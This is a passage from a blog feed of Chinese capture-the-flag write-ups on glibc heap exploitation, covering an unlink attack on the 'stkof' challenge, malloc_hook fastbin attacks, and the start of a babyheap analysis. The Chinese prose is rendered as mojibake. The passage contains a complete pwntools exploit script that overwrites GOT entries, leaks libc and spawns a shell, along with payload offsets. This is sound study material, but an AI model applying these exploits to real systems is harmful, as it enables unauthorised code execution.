ä¸ªé‡è¦å‡½æ•°ä¸­å¯ä»¥å¯ä»¥å‘ç°ï¼Œchunkçš„å †æŒ‡é’ˆè¢«å­˜æ”¾åœ¨äº†ä¸€ä¸ªæ•°ç»„s[ ]ä¸­ï¼Œè€ŒåŒå‡»æ•°ç»„så¯ä»¥å‘ç°ï¼Œå…¶åœ°å€æ˜¯0x0602140ï¼Œå®ƒæ˜¯ä¸€ä¸ªä½äºbssæ®µçš„æŒ‡é’ˆæ•°ç»„ï¼Œæ¢è¨€ä¹‹æ˜¯ä¸€ä¸ªå¯å†™çš„å…¨å±€å˜é‡ã€‚sæ˜¯æˆ‘ä»¬è¦†å†™gotè¡¨çš„å…³é”®ã€‚</p><p>â€‹        æœ‰å…¨å±€å˜é‡å­˜åœ¨ï¼Œå¯ä»¥åˆ©ç”¨unlinkæ¼æ´è¦†å†™gotè¡¨äº†ã€‚</p><h3 id="B-å†…å­˜å¸ƒå±€"><a href="#B-å†…å­˜å¸ƒå±€" class="headerlink" title="B .å†…å­˜å¸ƒå±€"></a>B .å†…å­˜å¸ƒå±€</h3><ul><li>ç”³è¯·4ä¸ªchunkï¼Œå…¶ä¸­chunk2æ˜¯small chunkã€‚ï¼ˆæœ¬ç¨‹åºæ²¡æœ‰ç”³è¯·é™åˆ¶ï¼Œå¯ä»¥ç”³è¯·å¤šä¸€ç‚¹ï¼Œåªè¦æ–¹ä¾¿å¸ƒå±€ã€‚ï¼‰</li><li>ç”¨chunk1çš„å †æº¢å‡ºè¦†ç›–chunk2ï¼Œæ”¹å†™å…¶FDå’ŒBKæˆs[0]-0x10(å³chunk2æŒ‡é’ˆ)ï¼Œæ”¹å†™chunk3çš„å¤´ä¿¡æ¯ã€‚</li><li>åœ¨ä¸Šä¸€æ­¥å®Œæˆçš„åŒæ—¶è¦é€šè¿‡æ£€æŸ¥ï¼Œä½¿ç³»ç»Ÿåœ¨é‡Šæ”¾chunk3æ—¶ç›¸ä¿¡chunk2ä¹Ÿå·²ç»é‡Šæ”¾äº†ï¼Œä»è€Œå‘å‰åˆå¹¶ã€‚</li><li>è¿™ä¸€åˆå¹¶ä¸è¦ç´§ï¼Œç³»ç»Ÿä¸€ä¸å°å¿ƒå°±æŠŠchunk2å¤„çš„å­˜æ”¾çš„æŒ‡é’ˆå‘ä½åœ°å€åç§»äº†0x18ï¼Œå¤Ÿæˆ‘ä»¬åœ°è‚†æ— å¿Œæƒ®å‘æŒ¥äº†ã€‚</li></ul><h3 id="C-Leak-amp-Getshell"><a href="#C-Leak-amp-Getshell" class="headerlink" title="C . Leak &amp; Getshell"></a>C . Leak &amp; Getshell</h3><ul><li>å†æ”¹å†™chunk2çš„å†…å®¹ï¼Œå®é™…ä¸Šå°±æ˜¯è¦†å†™sæ•°ç»„ï¼Œæ”¹å†™chunkæŒ‡é’ˆã€‚æ­¤æ—¶å¯å†™å…¥gotè¡¨åœ°å€äº†ã€‚</li><li>è¦†å†™æƒ…å†µï¼šs[0]=free@got,s[1]=puts@got,s[2]=atol@gotã€‚</li><li>å†åˆ©ç”¨fillå‡½æ•°å°†free@gotæ”¹æˆputs@gotï¼Œfree[1]å°±å¾—åˆ°äº†puts@pltã€‚</li><li>é€šè¿‡è®¡ç®—ï¼Œå¾—åˆ°libcåœ°å€å’Œsystemåœ°å€ï¼Œé€šè¿‡elfæ–‡ä»¶æœç´¢å¯ä»¥æ‰¾åˆ°â€œ/bin/shâ€ã€‚</li><li>åˆ©ç”¨filå°†atol@gotæ”¹å†™æˆsystemåœ°å€ã€‚</li><li>æœ€åç›´æ¥å‘é€â€/bin/shâ€éƒ½ä¼šè°ƒç”¨systemå‡½æ•°ï¼Œgetshellã€‚</li></ul><h3 id="D-Exp"><a href="#D-Exp" class="headerlink" title="D . Exp"></a>D . Exp</h3><p>â€‹    è´´ä¸€ä¸‹è„šæœ¬å‘—ï¼Œè™½ç„¶ä¸æ˜¯è‡ªå·±å†™çš„ã€‚ï¼ˆexp from ctf-wikiï¼‰æœ‰ç©ºå†è‡ªå·±å†™ä¸€éã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.binary = <span class="string">&quot;./stkof&quot;</span></span><br><span class="line">stkof = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;PID: &#x27;</span> + <span class="built_in">str</span>(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># trigger to malloc buffer for io function</span></span><br><span class="line">    alloc(<span class="number">0x100</span>)  <span class="comment"># idx 1</span></span><br><span class="line">    <span class="comment"># begin</span></span><br><span class="line">    alloc(<span class="number">0x30</span>)  <span class="comment"># idx 2</span></span><br><span class="line">    <span class="comment"># small chunk size in order to trigger unlink</span></span><br><span class="line">    alloc(<span class="number">0x80</span>)  <span class="comment"># idx 3</span></span><br><span class="line">    <span class="comment"># a fake chunk at global[2]=head+16 who&#x27;s size is 0x20</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)  <span class="comment">#prev_size</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment">#size</span></span><br><span class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x18</span>)  <span class="comment">#fd</span></span><br><span class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x10</span>)  <span class="comment">#bk</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment"># next chunk&#x27;s prev_size bypass the check</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite global[3]&#x27;s chunk&#x27;s prev_size</span></span><br><span class="line">    <span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(stkof.got[<span class="string">&#x27;free&#x27;</span>]) + p64(stkof.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(</span><br><span class="line">        stkof.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit free@got to puts@plt</span></span><br><span class="line">    payload = p64(stkof.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">    edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># free global[1] to leak puts addr</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.success(<span class="string">&#x27;/bin/sh addr: &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># modify atoi@got to system addr</span></span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    p.send(p64(binsh_addr))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Malloc_Hookå°è®°</title>
      <link href="2020/03/01/Malloc-Hook/"/>
      <url>2020/03/01/Malloc-Hook/</url>
      
        <content type="html"><![CDATA[<p>â€‹        malloc_hookçš„ä»‹ç»ä»¥åŠç”¨å †è¿›è¡Œmalloc_hookæ”»å‡»ã€‚<span id="more"></span></p><p>â€‹        æ˜¨å¤©çš„babyheapç®—æ˜¯ç¢°ä¸Šçš„ç¬¬ä¸€ä¸ªmalloc_hookåˆ©ç”¨ï¼Œè€Œä¸”çœ‹è¿™ä¹ˆç®€å•çš„åç§»éƒ½çœ‹ä¸æ˜ç™½ï¼Œè¿˜æ˜¯è®°ä¸€ä¸‹å§ã€‚</p><h2 id="0x00-å…³äºmalloc-hook"><a href="#0x00-å…³äºmalloc-hook" class="headerlink" title="0x00 å…³äºmalloc_hook"></a>0x00 å…³äºmalloc_hook</h2><p>â€‹        malloc_hookæ˜¯ä¸€ä¸ªä½äºmain_arenaé™„è¿‘çš„å‡½æ•°æŒ‡é’ˆã€‚</p><p>â€‹        å½“ç³»ç»Ÿè°ƒç”¨mallocï¼Œfreeå‡½æ•°æ—¶ï¼Œä¼šå¯¹æ­¤æŒ‡é’ˆè¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœæŒ‡é’ˆéç©ºåˆ™è·³è½¬åˆ°è¯¥åœ°å€å¹¶æ‰§è¡Œã€‚æ‰€ä»¥ï¼Œå°†shellcodeæˆ–è€…system(â€œ/bin/shâ€)çš„åœ°å€å†™å…¥åˆ°malloc_hookä¸­å†æƒ³åŠæ³•è°ƒç”¨æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„getshellæ€è·¯ã€‚</p><h2 id="0x01-malloc-hookä½ç½®"><a href="#0x01-malloc-hookä½ç½®" class="headerlink" title="0x01 malloc_hookä½ç½®"></a>0x01 malloc_hookä½ç½®</h2><p>â€‹        malloc_hookä½äºmain_arena(å¦‚æœä¸çŸ¥é“main_arenaåœ°å€å¯ä»¥ç›´æ¥ä½¿ç”¨å‘½ä»¤ x/20xg &amp;main_arena æŸ¥çœ‹å†…å­˜å’Œåœ°å€)å¾€ä¸Šï¼Œoffset = 0x10:</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/malloc/1.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/malloc/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" /><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/malloc/2.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/malloc/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" /><p>â€‹        ä¸€èˆ¬æ¥è¯´malloc_hookä¸ºç©ºï¼Œä½†æ˜¯æœ‰ä¸€æ¬¡å¶ç„¶å‘ç°äº†malloc_hookæœªè¢«æ”»å‡»å´æœ‰å€¼ï¼Œåæ¥æ‰å‘ç°æ˜¯ç¨‹åºè¿˜æ²¡æœ‰åˆå§‹åŒ–ã€‚</p><h2 id="0x03-malloc-hookæ”»å‡»"><a href="#0x03-malloc-hookæ”»å‡»" class="headerlink" title="0x03 malloc_hookæ”»å‡»"></a>0x03 malloc_hookæ”»å‡»</h2><h3 id="A-å¦‚ä½•å†™å…¥"><a href="#A-å¦‚ä½•å†™å…¥" class="headerlink" title="A.å¦‚ä½•å†™å…¥"></a>A.å¦‚ä½•å†™å…¥</h3><p>â€‹        å¦‚æœç¨‹åºä¸­å­˜åœ¨ä»»æ„å†™çš„æ¼æ´ï¼Œåˆ™ç”¨æˆ·å¯ä»¥å¾ˆå®¹æ˜“çš„è¿›è¡Œmalloc_hookæ”»å‡»ã€‚è¿™é‡Œç”¨å †åšä¸€ä¸ªå®ä¾‹ï¼ˆå®é™…ä¸Šä¹Ÿé€šå¸¸ç”¨å †ï¼‰ã€‚å°±fastbin attackæ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬æ”¹å†™chunkçš„fdï¼Œä½¿å…¶æŒ‡å‘malloc_hookä¸Šæ–¹ä¸€å®šåç§»å¤„ï¼Œå°±å¯ä»¥å¡«å……å¹¶å†™å…¥malloc_hookã€‚æ‰€ä»¥é—®é¢˜çš„å…³é”®å°±æ˜¯æˆ‘ä»¬è¦åœ¨å“ªå„¿åˆ›å»ºå †ï¼Œåˆ›å»ºå¤šå¤§çš„å †ï¼Œå¦‚ä½•å¡«å……æ•°æ®ã€‚</p><h3 id="B-ç”¨å †getshell"><a href="#B-ç”¨å †getshell" class="headerlink" title="B.ç”¨å †getshell"></a>B.ç”¨å †getshell</h3><p>â€‹        1.é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼Œåˆ›å»ºå †æ—¶å¡«å……æ•°æ®çš„ä½ç½®åœ¨chunk_ptr + 0x10ï¼ˆå³free chunkçš„FD BKæŒ‡é’ˆå¤„ï¼‰çš„ä½ç½®ï¼Œè€Œå‰é¢0x10ç”¨æ¥å­˜æ”¾å †ç»“æ„çš„éƒ¨åˆ†ä¿¡æ¯ï¼Œå…¶ä¸­å¾ˆé‡è¦çš„ä¸€ä¸ªä¿¡æ¯å°±æ˜¯chunk_sizeã€‚åœ¨åˆ›å»ºå †æ—¶chunk_sizeæ˜¯é¿å…æ£€æŸ¥ï¼Œå†³å®šå¡«å……åç§»çš„å…³é”®ã€‚</p><p>â€‹        2.ç”±æ­¤æˆ‘ä»¬éœ€è¦åœ¨malloc_hooké™„è¿‘æ‰¾ä¸€ä¸ªåˆé€‚çš„â€œchunk_sizeâ€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨è¯¥åœ°å€å¤„çš„æ•°æ®å……å½“chunk_sizeï¼Œè€Œä¸”è¦è®©å…¶æ»¡è¶³fastchunkçš„å¤§å°ã€‚ç»è¿‡å®éªŒï¼Œå¯ä»¥æ‰¾åˆ°main_ arena - 0x40 + 0xd è¿™ä¸ªä½ç½®ï¼ˆä¸ç†è§£çš„è¯å¯ä»¥0x0 â€“ 0x10 éƒ½è¯•ä¸€ä¸‹ï¼Œæ‰¾æœ€åˆé€‚çš„åç§»ï¼‰ã€‚<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/malloc/3.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/malloc/3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" /></p><p>â€‹        åœ¨æ­¤åç§»å¤„çš„0x7fè¿™ä¸ªå­—èŠ‚æ°å¥½æ»¡è¶³éœ€æ±‚ï¼Œå±äºfastchunkã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªåœ°å€mallocï¼ˆ0x60ï¼‰ï¼Œç³»ç»Ÿå°±ä¼šç»™æˆ‘ä»¬åˆ†é…0x70çš„ç©ºé—´ï¼Œä¹Ÿæ»¡è¶³0x7fçš„chunksizeã€‚</p><p>â€‹        3.ç”³è¯·å¥½chunkä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“åç§»é‡ã€‚å‡è®¾æˆ‘ä»¬å·²ç»leakå‡ºäº†libc_baseï¼Œé‚£ä¹ˆå°±å¯ä»¥æ ¹æ®main_arenaåœ¨libcä¸Šçš„å›ºå®šåç§»å¹¶é€šè¿‡è®¡ç®—å¾—çŸ¥ä»¥ä¸‹å…³ç³»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">main_arena == libc_base + <span class="number">0x3c4b20</span> </span><br><span class="line">chunk_addr == main_arena - <span class="number">0x40</span> + <span class="number">0xd</span></span><br><span class="line">chunk_addr == libc_base + <span class="number">0x3c4b20</span> - <span class="number">0x40</span> + <span class="number">0xd</span></span><br><span class="line">chunk_addr == libc_base + <span class="number">0x3c4aed</span></span><br><span class="line">malloc_hook== main_arena - <span class="number">0x10</span></span><br><span class="line">fill_size  == malloc_hook - chunk_addr</span><br><span class="line">fill_size  == <span class="number">0x23</span></span><br></pre></td></tr></table></figure><p>â€‹        æ‰€ä»¥è¯´æˆ‘ä»¬éœ€è¦å¡«å……çš„å¤§å°å°±æ˜¯0x23ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">3</span></span><br><span class="line">payload +=p64(<span class="number">0</span>)</span><br><span class="line">payload +=p64(shellcode)</span><br></pre></td></tr></table></figure><p>â€‹            4.å¡«å……å¥½ä¹‹åï¼Œå†è¿›è¡Œä¸€æ¬¡malloc()å°±å¯ä»¥getshelläº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastbin attack (Babyheap)</title>
      <link href="2020/02/29/Fastbin_attack(Babyheap)/"/>
      <url>2020/02/29/Fastbin_attack(Babyheap)/</url>
      
        <content type="html"><![CDATA[<p>â€‹        åˆ©ç”¨malloc_hookè§£é¢˜ã€‚<span id="more"></span></p><h2 id="1-å…³äºFast-bin"><a href="#1-å…³äºFast-bin" class="headerlink" title="1.å…³äºFast_bin"></a>1.å…³äºFast_bin</h2><p>â€‹        fast binå’Œå…¶ä»–çš„binä¸€æ ·ï¼Œéƒ½æ˜¯ä¸€ç§ç”¨æ¥è®°å½•free chunkçš„<strong>é“¾è¡¨æ•°æ®ç»“æ„</strong>æœ‰å•é“¾è¡¨æœ‰åŒé“¾è¡¨ï¼Œå› ç§ç±»ä¸åŒåŠŸèƒ½ä¸åŒè€Œé‡‡ç”¨ä¸åŒçš„ç»“æ„ã€‚fast binä¸“é—¨ä½¿ç”¨äºå­˜æ”¾æ¯”è¾ƒå°çš„chunkï¼Œå…·ä½“ä¸º16 bytes â€“ 80 bytesï¼ˆæ­¤å¤„æŒ‡mallocçš„å®é™…å¤§å°ï¼‰fast binçš„è®¾è®¡åˆè¡·å°±æ˜¯è¿›è¡Œå¿«é€Ÿçš„<strong>å°å†…å­˜</strong>åˆ†é…å’Œé‡Šæ”¾ï¼Œå› æ­¤fast chunkä¹‹é—´æ˜¯ä¸è¿›è¡Œåˆå¹¶çš„ï¼Œå³ä¸å­˜åœ¨unlinkã€‚å› æ­¤å…¶ next_chunk çš„ prev_inuse ä½ä¹Ÿä¸ä¼šè¢«æ¸…ç©ºã€‚ï¼Œä¹Ÿå°±å‚¬ç”Ÿäº†fast binçš„æ¼æ´ã€‚</p><h2 id="2-babyheapå¤ç°"><a href="#2-babyheapå¤ç°" class="headerlink" title="2.babyheapå¤ç°"></a>2.babyheapå¤ç°</h2><h3 id="A-é¢˜ç›®åˆ†æ"><a href="#A-é¢˜ç›®åˆ†æ" class="headerlink" title="A.é¢˜ç›®åˆ†æ"></a>A.é¢˜ç›®åˆ†æ</h3><ul><li><p>Link â€“ <a href="https://uaf.io/assets/0ctfbabyheap">https://uaf.io/assets/0ctfbabyheap</a></p><p>å¸¸è§„æ“ä½œï¼šä¸¢ubuntuåˆ†æï¼šä¿æŠ¤å…¨å¼€ï¼Œä¸€èˆ¬éƒ½æ˜¯å †é¢˜ã€‚ã€‚</p><div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/4.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="4" style="zoom: 57%;" /></div>ä¸¢ida_64åˆ†æï¼š<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">sub_B70</span>();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">Read</span>();</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> ( off_14F4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">        <span class="built_in">Add</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">        <span class="built_in">Fill</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">        <span class="built_in">Free</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">        <span class="built_in">Dump</span>(v4);                             </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5uLL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>Add()ï¼šæ–°å»ºchunk,ç”±ç”¨æˆ·è¾“å…¥size,ç”¨callocåˆ†é…å†…å­˜,å…ˆè¡Œåˆå§‹åŒ–chunkã€‚</p></li><li><p>Fill()ï¼šå†™å…¥chunk,ç”±ç”¨æˆ·å†³å®šsizeï¼Œä¸Add()sizeä¸åŒ,æ‰€ä»¥å­˜åœ¨å †æº¢å‡ºã€‚</p></li><li><p>Free()ï¼šåˆ é™¤chunk,è€Œä¸”æŒ‡é’ˆç½®ç©º,ä¸å­˜åœ¨UAFæ¼æ´ã€‚</p></li><li><p>Dump()ï¼šè¾“å‡ºchunk,æ²¡å•¥ç‰¹åˆ«ã€‚</p><p>å¦å¤–è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯ï¼Œæ–‡ä»¶å­˜åœ¨alarm()å‡½æ•°ï¼Œå› æ­¤åœ¨è°ƒè¯•æ—¶æœ‰æ—¶é—´é™åˆ¶ã€‚</p><img 